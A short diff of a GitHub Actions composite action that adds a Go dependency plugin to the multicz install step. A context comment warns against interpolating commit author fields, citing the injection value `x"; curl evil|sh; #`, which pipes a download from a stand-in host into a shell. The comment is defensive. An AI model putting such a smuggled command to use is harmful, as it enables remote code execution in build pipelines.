@@ -44,9 +44,12 @@ runs:
       with:
         enable-cache: false
         python-version: "3.12"
+    # multicz-go-deps-plugin's affects() hook (see [plugins.go-deps] in
+    # multicz.toml) is also consulted by the bump plan computed below, not
+    # just `multicz changed` - both need the same plugin installed.
     - name: Install multicz
       shell: bash
-      run: uv tool install multicz
+      run: uv tool install multicz --with multicz-go-deps-plugin
     # The author name and email arrive through `env:`, never interpolated
     # into the script body. `${{ }}` is substituted before bash sees the
     # line, so a commit authored as `x"; curl evil|sh; #` would execute in a
